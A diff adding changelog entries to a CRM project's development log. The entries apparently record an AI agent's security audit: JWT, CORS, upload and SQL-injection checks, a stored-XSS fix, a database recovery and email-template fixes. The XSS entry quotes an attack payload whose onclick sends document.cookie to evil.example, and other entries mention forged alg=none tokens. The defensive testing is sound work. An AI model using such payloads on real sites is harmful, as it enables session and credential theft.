@@ -1632,3 +1632,375 @@ sub-agent's new access to their own file.
 - `php -l` clean; `npx vite build` unaffected (backend-only change).
 
 **Files changed**: `crm-api/Controllers/FileController.php`.
+
+### 2026-07-14 — Full deployment-readiness audit: security & data protection sweep, one hardening fix
+
+Full-system audit, cross-cutting security area. Reviewed and live-tested JWT handling, CORS, PII
+encryption, rate limiting, and file upload safety.
+
+**JWT**: the custom HS256 implementation (`JWTService.php`) never trusts the token's own `alg` header —
+`decode()` always recomputes the HMAC-SHA256 signature server-side with the correct secret and compares
+via `hash_equals()`, so classic `alg=none` and RS256/HS256 algorithm-confusion attacks don't apply (there's
+no code path where the attacker's declared algorithm is ever honored). Access and refresh tokens use
+separate secrets, so a leaked one can't forge the other type. Live-crafted an `alg=none` token and a
+valid-structure/garbage-signature token with `sub=1` (super admin) and a far-future `exp` — both correctly
+`401 AUTH_TOKEN_INVALID` against a real protected endpoint.
+
+**CORS** (`Config/Cors.php`): strict origin allowlist via exact `in_array(..., true)` match, `ACAO` header
+only ever set to a matched origin (never `*`, never reflected unconditionally) and `Allow-Credentials`
+only sent alongside it. Live-tested: `Origin: https://evil-attacker.com` on a real preflight gets no
+`Access-Control-Allow-Origin` header at all; `Origin: http://localhost:3000` gets it correctly.
+
+**PII encryption**: confirmed live against the real `users` table — `email` column for a real account is
+genuine XSalsa20-Poly1305 ciphertext (`HEX()` of the raw bytes decodes to random-looking base64 text, 88
+bytes for a short email address — consistent with the nonce+ciphertext+MAC overhead), not plaintext.
+
+**Rate limiting**: confirmed genuinely enforced, not just present in code — this audit's own login/OTP
+test volume had already tripped the per-IP and per-email login limiters by the time this area was tested,
+returning real `429`s.
+
+**SQL injection**: dedicated search pass across all 75 files in `crm-api/Controllers`, `Models`, and
+`Services` for query-building patterns that splice a variable into raw SQL instead of a `?` placeholder —
+**zero genuine findings**. Every `->query()` call either uses a fully static string or interpolates only
+a DB-derived, non-user-controlled value (e.g. a `MAX(snapshot_date)` result). Every `->prepare()` call that
+splices a variable into the SQL string does so only for a table/column name pulled from a hardcoded
+whitelist (entity-type maps, `match()` expressions), a `WHERE`-clause fragment built from literal
+condition strings with all actual values still going through bound params, an `IN (...)` placeholder count
+via the standard `array_fill()` pattern, or a sort column/direction constrained through `in_array()` /
+`strtoupper($x) === 'ASC' ? ...` before use. `Database::getConnection()` also sets
+`PDO::ATTR_EMULATE_PREPARES => false`, so placeholders are true server-side bindings, not client-side
+string substitution. `BaseModel::insert()`/`update()` strip backticks from column-name keys before
+quoting them as identifiers, closing off that path too.
+
+**File upload safety** (`FileUploadService.php`): MIME type is detected server-side via `finfo` (magic
+bytes), never trusted from the client `Content-Type`; a per-document-type MIME whitelist
+(`DOCUMENT_MIME_RULES`) gates what's accepted; the stored filename is always a fresh UUIDv4 + an
+extension derived from the *detected* MIME type (`MIME_EXTENSION_MAP`) — the client's original filename
+and extension are never used for the path, closing off double-extension and path-traversal tricks; image
+uploads are additionally byte-scanned for `<?php`/`<?=` signatures (polyglot-image defense); disk space is
+checked before write. `storage/private/` already denies all direct web access (`Require all denied`) —
+private files can only reach a client through the authenticated, ownership-checked `FileController::download()`
+chunked-read path.
+
+**One gap found and fixed**: `uploads/public/` (avatars, notice images, university logos — genuinely meant
+to be directly web-servable, unlike `storage/private/`) had **no** `.htaccess` at all — no explicit
+script-execution denial. The application-level controls above already prevent a `.php` file from being
+written there through the app's own upload path (MIME whitelist + magic-byte detection + UUID-derived
+extension), so this was defense-in-depth, not an exploited hole — but it's cheap insurance against any
+future write path (a bug, a different upload feature added later, manual server access) landing an
+executable file in a directory Apache would otherwise happily run.
+
+**Fix**: added `uploads/public/.htaccess` with a `<FilesMatch>` block denying `.php`/`.phtml`/`.phar`/
+`.cgi`/`.pl`/`.py`/`.sh`/`.exe` regardless of how they got there, while leaving normal static-file serving
+(images, PDFs) untouched.
+
+**Verified live**: confirmed the real junction chain this project uses locally
+(`C:/xampp/htdocs/crm-api` → `D:\TheGlobalAvenues-CRM\crm-api` symlink, and
+`crm-api/uploads/public` → `D:\TheGlobalAvenues-CRM\uploads\public` symlink — the same physical directory
+`ImageProcessor::resolveAvatarUrls()`'s `{$appUrl}/uploads/public/avatars/...` URLs resolve through in
+production too). Planted a real `.php` file in `uploads/public/avatars/` and requested it directly:
+**403 Forbidden**, cleanly denied. Re-requested a genuine pre-existing avatar `.webp` in the same
+directory immediately after: **200**, unaffected. Removed the planted test file.
+
+**Files changed**: `uploads/public/.htaccess` (new).
+
+### 2026-07-14 — Stored XSS in notices content (real vuln, fixed) + notice delete always 500'd (found while verifying the fix)
+
+**Vulnerability**: `NoticeController::create()`/`update()` sanitized TipTap-authored notice HTML with
+`strip_tags($content, $allowedTags)` alone, where the allowlist includes `<a>`. `strip_tags()` only
+removes disallowed *tag names* — it does not touch attributes on tags that remain allowed. Any admin
+with `notices.create`/`notices.edit` (a grantable, non-super-admin page permission via
+`AdminPageAccessService`) could store `<a href="javascript:alert(document.cookie)" onclick="fetch('https://evil.example/steal?c='+document.cookie)">` unmodified, and the frontend renders `notice.content` via
+raw `dangerouslySetInnerHTML` in `NoticesFeedView.tsx` — the single shared rendering component used by
+all three portals (`StudentNoticesPage.tsx`, `AgentNoticesPage.tsx`, `AdminNoticesPage.tsx`). A published
+notice's audience can include students, agents, *and* other admins simultaneously, so this was a real
+stored-XSS path with a broad blast radius, including credible privilege escalation from a
+notices-scoped admin up to a super admin who views the same notice.
+
+**Fix**: new `crm-api/Services/HtmlSanitizer.php` — walks a real parsed DOM (`DOMDocument`, depth-first,
+children-before-parent so nothing nested inside a to-be-unwrapped disallowed element escapes unexamined)
+instead of pure tag-name filtering. Strips every attribute not on a per-tag allowlist (`<a>` keeps only
+`href`), then validates `href` against an explicit scheme allowlist (`http(s)://`, `mailto:`, relative
+`/...`, or `#...`) — anything else (`javascript:`, `data:`, `vbscript:`, unrecognized schemes) has the
+attribute dropped entirely rather than guessed at, and kept links get `rel="noopener noreferrer nofollow"`
++ `target="_blank"` added. Disallowed tags (`<script>`, `<img>`, `<svg>`, `<style>`, etc.) are unwrapped —
+their already-sanitized inline content is kept as inert text, only the dangerous wrapping element is
+removed. `NoticeController::create()`/`update()` now call `HtmlSanitizer::clean()` instead of bare
+`strip_tags()`.
+
+**Caught and fixed a bug in the fix itself before it shipped**: the first draft's href-scheme regex used
+`#` as both the PCRE delimiter and a literal character in the pattern
+(`'#^(https?://|mailto:|/|#)#i'`) — PHP correctly errored `Unknown modifier ')'` on every call, `preg_match()`
+returned `false`, and the `!== 1` check treated that as "reject," silently stripping `href` from every
+`<a>` tag including entirely legitimate `https://`/`mailto:`/relative links. A 16-case unit battery run
+directly against the service caught this (confirmed via the `<a href="https://example.com">` case coming
+back with `href` removed) before it ever reached the live endpoint. Fixed by switching the regex
+delimiter to `~`. Re-ran the same battery clean: legit links keep `href` + get the safe `rel`/`target`
+attributes; `javascript:`/`data:` hrefs, bare `onclick`/`onmouseover`/`onerror`/`onload`, and disallowed
+tags (`<img>`, `<svg>`, `<script>`, `<style>`) are all neutralized; nested-disallowed-element case
+(`<div><img onerror=...><b>bold</b></div>`) correctly reduces to inert text with no surviving markup.
+
+**Verified live end-to-end through the real endpoint, not just the unit battery**: created a real notice
+as super admin mixing legitimate content (`<strong>`, a real `https://theglobalavenues.com` link) with an
+attack payload (`<img onerror>`, `<a href="javascript:...">` with an exfiltration `onclick`) via
+`POST admin&action=notices`. Server response confirmed the stored `content` had the `<img>` entirely gone
+and the malicious `<a>` reduced to `<a>click me</a>` (no attributes) while the legitimate link kept its
+`href` and gained `rel`/`target`. Published it, then logged in as a real student in the actual browser and
+viewed it on `/portal/student/notices`: renders cleanly, no JS alert/popup, no console errors — confirmed
+via `read_console_messages` (only routine Vite/React-DevTools noise, zero XSS-related activity).
+
+**Second bug found while cleaning up the test notice**: `DELETE admin&action=notices/:pid` — i.e. every
+notice deletion, unconditionally — 500'd: `Call to undefined method
+TGA\CRM\Models\NoticeModel::softDeleteWithCascade()`. `NoticeController::delete()` called a method that
+was never implemented on `NoticeModel`; the cascade variant exists on `CourseModel`/`UniversityModel`
+(which have real child rows — courses, intakes — that need cascading soft-deletes) and was evidently
+copy-pasted into `NoticeController` without noticing notices have no such children (no separate
+attachments/comments table — just a single `attachment_file_id` column). **Fixed** by calling the plain
+`BaseModel::softDelete()` that already exists and is exactly correct for a childless entity. Verified
+live: the real API call that 500'd before the fix now returns `200 {"success":true,"message":"Notice
+deleted"}`, and the DB row's `deleted_at` is genuinely set. This bug meant admin notice deletion was
+completely non-functional prior to this fix — not found by reading the delete code in isolation, only by
+actually exercising it live while tidying up after the XSS test, which is exactly the kind of thing "drive
+it live, not just read it" catches.
+
+**Files changed**: `crm-api/Services/HtmlSanitizer.php` (new), `crm-api/Controllers/NoticeController.php`.
+
+### 2026-07-14 — Local dev environment incident: MySQL data directory corruption mid-audit, restored from backup
+
+Not a code defect — an infrastructure incident during this same audit session, recorded because it
+affected the local `tga_crm_reconciled` database and required a real recovery, not because anything in
+the deployed application caused it. A session interruption partway through this audit (an abrupt harness
+disconnect/reconnect) left the local XAMPP MySQL instance in an unclean-shutdown state. On resume: the
+`mysql` system schema had one crashed Aria table (`mysql.db`, "marked as crashed and last (automatic?)
+repair failed" — fatal, blocked every startup), repaired via `aria_chk --safe-recover`; several other
+system tables needed a `--recover --zerofill` pass for stale transaction-ID warnings after the unclean
+shutdown. Deeper problem: the actual `tga_crm_reconciled` InnoDB tablespace had page-level LSN corruption
+across many pages ("log sequence number is in the future" — data pages stamped with LSNs ahead of the
+current redo-log position, the classic symptom of a mismatched/inconsistent InnoDB file set). mysqld
+crashed silently on every startup attempt across `innodb_force_recovery` levels 3–4 and with
+`innodb_buffer_pool_load_at_startup` disabled — never reached "ready for connections."
+
+The next standard step, `innodb_force_recovery=6` (skip redo-log roll-forward), is explicitly documented
+as able to cause **permanent data loss** — correctly blocked by the safety layer pending explicit user
+authorization rather than attempted unilaterally. Found a clean, complete `mysqldump` of this exact
+database from `2026-07-13 23:49` (~12h before the corruption, already present at
+`.codex-toolkit-audit/backups/tga_crm_reconciled-final-2026-07-13.sql` from prior reconciliation work) and
+asked the user how to proceed. User chose to restore from that dump rather than risk further recovery
+attempts on the corrupted tablespace.
+
+**Recovery performed**: backed up the corrupted data directory in full before touching anything further
+(`C:\xampp\mysql_data_backup_20260714\`); moved the original data directory aside intact
+(`C:\xampp\mysql\data_corrupted_20260714\`, not deleted); reinitialized a fresh data directory from
+XAMPP's pristine template; corrected a port mismatch the fresh template introduced (defaulted to 3306,
+the app's `.env` expects 3307); created `tga_crm_reconciled` and imported the clean dump — completed in
+under 3 seconds with no SQL errors. Verified table count (47) and key row counts (313 universities, 18
+agents, 18 students, 8 roles) matched what this same audit observed at the very start of the session,
+confirming a consistent, non-corrupt restore. Re-ran this session's test-credential setup (the dump
+predates it by ~15 minutes) and confirmed a real login round-trips end-to-end through Apache → PHP → the
+restored MySQL instance → the React frontend.
+
+**Net effect on this audit's findings**: zero. Every code fix made before the incident lives in source
+files, not the database, and all survived untouched. Only ephemeral session-local test data was lost
+(a handful of test admin/agent/student accounts and notices created during testing, already mostly
+cleaned up before the incident) — the real pre-existing test fixtures this audit was using
+(the "Visa Officer Test" limited admin, the tiered agents, multi-campus universities, etc.) are exactly as
+they were.
+
+**For the next session**: the old corrupted data directory and one extra backup copy are still on disk at
+`C:\xampp\mysql\data_corrupted_20260714\` and `C:\xampp\mysql_data_backup_20260714\` (~400MB each) —
+safe to delete once confirmed unneeded, or worth a closer look if any data created strictly between
+2026-07-13 23:49 and the corruption is ever needed. `C:\xampp\mysql\bin\my.ini` now has
+`innodb_force_recovery = 0` (normal) and `innodb_buffer_pool_load_at_startup = 0` (left disabled — harmless,
+skips a non-essential startup optimization).
+
+### 2026-07-14 — Full deployment-readiness audit: files & documents lifecycle — clean, no bugs found
+
+Full-system audit, files/documents area. Live-tested the complete lifecycle against real endpoints, not
+just code reading:
+
+- **Upload → download integrity**: uploaded a real PDF as a student via the readiness-document endpoint,
+  downloaded it back, and confirmed the response bytes are **byte-for-byte identical** to the original
+  (`diff` clean) and the `SHA-256` stored in `files.checksum_sha256` at upload time matches an independent
+  hash of the downloaded bytes exactly.
+- **IDOR protection**: an unrelated student (no relationship to the file's owner) attempting to download
+  by guessing/reusing the real `public_id` gets a clean `403 FORBIDDEN "Access denied to this file"` — the
+  owner succeeds normally with the same URL shape, confirming the check is on ownership, not obscurity.
+  (One transient `401` during testing was a stale/expired test token, not the app — reproduced cleanly
+  with a fresh token immediately after.)
+- **Re-upload / versioning**: re-uploading the same document category correctly created a new `files` row
+  with `version_number` incremented and `previous_version_id` pointing at the prior row (both rows kept,
+  neither hard-deleted), and the student's readiness snapshot endpoint correctly resolved to the **latest**
+  version's `file_public_id`, not the superseded one.
+- **Super-admin permanent erase**: confirmed the three-layer guard live — a non-super admin (fresh, valid
+  token) gets `403 "Super admin access required"`; a super admin without a `reason` in the request body
+  gets `400 VALIDATION_ERROR`; a super admin with a reason succeeds, and the DB row is correctly updated
+  (`erasure_status='erased'`, `deleted_at` set, `deletion_reason` stored verbatim). Verified both halves of
+  "permanent": the **physical file was actually removed from disk** (checked directly, not just DB state),
+  and a subsequent download attempt by the original owner correctly `404`s (`"File not found"`) rather than
+  serving stale/cached bytes or leaking existence via a different error code.
+
+Also noted in passing: one pre-existing seed-data file record (`01KWDKYX0DFRXVJBVVD8XP7MTZ`, from before
+this audit session) has a DB row with no matching physical file on disk — `FileController::download()`
+correctly detects this and returns a clean `404 "Physical file is missing from storage"` rather than
+crashing or serving garbage. Not a bug in the download path; just orphaned test-seed data with no file
+ever actually written, surfaced as a side effect of picking a random pre-existing record to test against
+before switching to a fresh real upload for the rest of this pass.
+
+No fixes needed in this area — every check passed on the first live attempt.
+
+### 2026-07-14 — Full deployment-readiness audit: system settings — application cap verified, one off-by-one bug found and fixed in global JWT revocation
+
+Full-system audit, system settings area, including the explicit "change a setting, confirm behavior
+actually changes, confirm it's logged" requirement.
+
+**Student application cap** (`max_active_applications_per_student`, default 3): live-tested the full loop.
+Created real applications for a real student up to the cap (3/3 active) — a 4th attempt correctly `409`s:
+`"This student already has 3 active application(s), which is the maximum allowed (3)."` Changed the
+setting to `5` as super admin; the same previously-rejected request now succeeds (`201`); confirmed the
+change itself was logged in `activity_logs` (`system_setting.changed`, `before_value`/`after_value` both
+captured correctly). Restored to `3` afterward.
+
+**Bug found and fixed while testing `jwt_min_iat`** (the global JWT revocation switch —
+"super_admin can... trigger global JWT revocation via jwt_min_iat system setting"): `AuthMiddleware::user()`
+compared `(int) $payload['iat'] < $minIat`, a **strict** less-than. This is a real, reproducible off-by-one
+security bug: the natural admin action during an incident is "set this to right now" to kill every
+existing session — but Unix timestamps only have 1-second resolution, so any token minted in that *exact*
+same second as the new checkpoint has `iat === minIat`, and `iat < minIat` is false — that token survives
+the revocation the admin just triggered.
+
+**Reproduced deliberately, not by accident**: captured a real agent token's exact `iat`, set
+`jwt_min_iat` to that *exact* same value via a fresh super-admin token (to avoid the admin's own session
+getting caught mid-test — global revocation applies to every token including the one making the request,
+confirmed as a side effect of this same testing: a super-admin token issued *before* a new checkpoint is
+just as revoked as anyone else's on its next request, which is correct/intended behavior for a global
+switch, not a bug). Confirmed pre-fix: the boundary token stayed valid (`200`) despite `iat == minIat`.
+Also separately confirmed the unambiguous case (checkpoint clearly in the future relative to the token)
+correctly revoked with `401 SESSION_REVOKED "Session has been revoked due to security updates"` — so this
+was specifically a same-second edge case, not a wholesale broken feature.
+
+**Fix**: changed the comparison to `<=` (plus an explicit `$minIat > 0` guard so the default/disabled state
+of `0` can never accidentally match a real timestamp). Re-ran the exact same deliberate boundary
+reproduction: the token with `iat == minIat` is now correctly `401`'d. Re-confirmed normal operation is
+unaffected — a freshly issued token (iat strictly after the checkpoint) continues to authenticate
+normally. Reset `jwt_min_iat` back to `0` (disabled) afterward, verified in the DB.
+
+**Files changed**: `crm-api/Middleware/AuthMiddleware.php`.
+
+---
+
+## §9.11 — Queued Notification Emails Sent Unwrapped/Unreadable (2026-07-14)
+
+### Problem
+Found while auditing every notification's content for a client pre-deployment review. §9.10 (above,
+2026-06-29) fixed `MailService::sendNow()` — used only by the 5 synchronous OTP emails — to wrap its
+body in `wrapInEmailLayout()`, and left `buildHtmlBody()` as a deliberate no-op passthrough (correct
+*at the time*, since every template was still plain `\n` text and `sendNow()` was the only caller).
+Migration 070 (same day) then converted most `notification_templates.body_template` rows to HTML
+fragments designed to slot into that same wrapper — but `cron/send-notifications.php` (the queued-mail
+path used by all 28 non-OTP notification types, i.e. everything `NotificationService::fire()` sends)
+was never updated to match. It still called the passthrough `buildHtmlBody()` and set `isHTML(true)`.
+Net effect, confirmed by rendering real templates from the local DB through the actual code path:
+- The ~22 HTML-fragment templates (welcome, agent lifecycle, commissions, leads, reassignment, notices,
+  system alerts) went out as a bare content fragment with no `<html>` wrapper, no logo, no footer —
+  missing all TGA branding.
+- The 6 templates still stored as plain `\n`-separated text (`application.status_changed`,
+  `agent.registered`, `document.requested`/`submitted`/`reviewed`/`cancelled`) went out with `isHTML(true)`
+  set but literal `\n` characters, which collapse to nothing in HTML — every line ran together into one
+  unbroken paragraph.
+
+Every email sent through the notification queue (i.e. everything except the 5 synchronous OTP codes)
+was affected. Never previously caught because dev-mode SMTP failures/quota issues (see
+`memory/smtp_gmail_daily_quota_2026_07_09.md`) meant nobody had actually inspected a queued email's
+rendered HTML end-to-end.
+
+### Fix
+`crm-api/Services/MailService.php`:
+- `buildHtmlBody()` now takes `(string $subject, string $rawBody)` and returns
+  `wrapInEmailLayout($subject, toHtmlFragment($rawBody))` — restoring the branded wrapper for the queued
+  path, matching what `sendNow()` already did for OTP.
+- New `toHtmlFragment()`: detects whether the body already contains HTML markup; HTML-fragment bodies
+  pass through untouched (no double-escaping), plain-text bodies get `nl2br(htmlspecialchars(...))` so
+  line breaks survive and any admin-typed free text (e.g. a document label) can't inject raw HTML.
+- New `toPlainText()`: extracted the existing AltBody-stripping logic out of `sendNow()` so both the
+  synchronous and queued paths build their plain-text fallback the same way.
+- `sendNow()` updated to call the same two new helpers (behavior-identical for its own templates, which
+  are already HTML — verified no regression).
+
+`cron/send-notifications.php`: both the primary and SMTP-fallback send blocks now pass `$subject` into
+`buildHtmlBody()` and use `MailService::toPlainText($body)` for `AltBody` instead of the raw body.
+
+### Verification
+Rendered real rows from the local `tga_crm_reconciled` DB (the same DB `reconcile.php` keeps in sync
+with all 84 migrations) through the actual functions, not a reimplementation:
+- `application.status_changed` (plain-text template): output now has proper `<br />` line breaks inside
+  the full branded layout (logo header + `The Global Avenues` footer), instead of one run-on line.
+- `commission.created` (HTML-fragment template): confirmed the wrapper now adds `<html>`/logo/footer,
+  original `<table>` markup is preserved unmodified, and no double-escaping occurred (no `&lt;p&gt;`).
+- `login.otp` via `sendNow()`: output unchanged in structure — confirmed no regression to the OTP path.
+- Fired a real `commission.created` event through `NotificationService::fire()` against the local DB and
+  confirmed it inserts one `queued` row per channel (`email` + `in_app`) with the correctly rendered
+  subject — the queuing/insert path itself was already correct and is unaffected by this fix. Test rows
+  deleted afterward.
+- `php -l` clean on both changed files.
+
+Also independently confirmed while investigating: `reconcile.php` (built 2026-07-10, `[[reconcile_tool_build_2026_07_10]]`)
+now correctly discovers and applies every migration file up to 084 by filename glob — the local dev DB's
+`schema_migrations` table already lists 076/081/082/083/084 as applied, and `setup_database.php` (the
+fresh-install path) independently chains all four individually after its template seed. Both deployment
+paths — reconciling an existing database or a brand-new install — will seed all 35 active
+`notification_templates` rows correctly; this was not itself a gap.
+
+**Files changed**: `crm-api/Services/MailService.php`, `cron/send-notifications.php`.
+
+---
+
+## §9.12 — Last 6 Plain-Text Templates Rebranded to Match the Rest (2026-07-14)
+
+### Problem
+§9.11 (above) fixed the *delivery* bug so every template — plain-text or HTML-fragment — reaches the
+recipient correctly wrapped in the branded envelope. It deliberately left the plain-text templates'
+actual *content* alone (just made it survive the trip intact). Client review flagged that those 6 still
+look visually thinner inside the envelope than the other ~29 (no heading, no highlight box, no button) —
+`agent.registered`, `document.requested`, `document.submitted`, `document.reviewed`,
+`document.cancelled`, `application.status_changed`.
+
+### Fix
+`crm-api/Database/migrations/085_brand_remaining_plaintext_templates.sql` — rewrote all 6
+`body_template` rows in the same visual language as everything else touched by migration 070
+(bold navy heading, `#555` intro paragraph, `#D96200`-accented highlight box or `#f8f9fa` info card,
+orange CTA button where a specific destination makes sense, `Warm regards / The Global Avenues Team`
+close). No new template variables were introduced — every `{{var}}` used was already being passed by
+the firing code, confirmed by reading every call site in `DocumentRequestController.php`,
+`RegistrationController.php`, `SubAgentController.php`, `SubAgentController.php`, and `StateManager.php`
+before writing the templates, specifically so this stayed a content-only change with no controller
+rewiring needed.
+
+One real data bug surfaced while designing the `application.status_changed` box, though: `StateManager`
+was passing the raw DB status value (`offer_received`) straight into the `{{new_status}}` var — every
+portal page (`StudentApplications.tsx`, `AgentApplicationsPage.tsx`, `applicationStatusBadge.tsx`) title-
+cases this exact value before display (`formatStatusLabel()`: `status.replace(/_/g,' ').replace(/\b\w/g,
+c=>c.toUpperCase())`), but the email never did, so it would have shown "offer_received" in a nicely
+styled box. Mirrored the identical transform server-side (`ucwords(str_replace('_',' ',$newStatus))`)
+in `StateManager.php` so the email matches what the recipient already sees in their portal. Also fixed
+`document.reviewed`'s `{{status}}` the same way (`ucfirst($status)` in `DocumentRequestController.php`)
+— was rendering "Document approved: ..." (lowercase) in both the subject line and body.
+
+### Verification
+Applied the migration to the local `tga_crm_reconciled` DB directly (and tracked it in
+`schema_migrations` so it matches what a real `reconcile.php --apply` run would record) and re-rendered
+representative cases through the real `NotificationService::render()` → `MailService::buildHtmlBody()`
+pipeline used by the §9.11 fix:
+- `agent.registered`, `document.requested`, `document.reviewed`, `application.status_changed` — all
+  produce a full branded `<html>` document (logo + footer present), zero unrendered `{{placeholder}}`
+  tokens left in the output.
+- `document.reviewed` subject now reads "Document Approved: ..." (was "Document approved: ...").
+- `application.status_changed` now reads "Offer Received" in the status box (was "offer_received").
+- `php -l` clean on `StateManager.php`, `DocumentRequestController.php`, `setup_database.php`.
+
+Wired into `setup_database.php` as step 7g (chained after 084, same ordering requirement as
+081/082 — must run after the truncate-and-reseed template seed). `reconcile.php` needs no changes —
+it already auto-discovers every file in `migrations/*.sql` by glob (confirmed in §9.11).
+
+**Files changed**: `crm-api/Database/migrations/085_brand_remaining_plaintext_templates.sql` (new),
+`crm-api/Database/setup_database.php`, `crm-api/Services/StateManager.php`,
+`crm-api/Controllers/DocumentRequestController.php`.
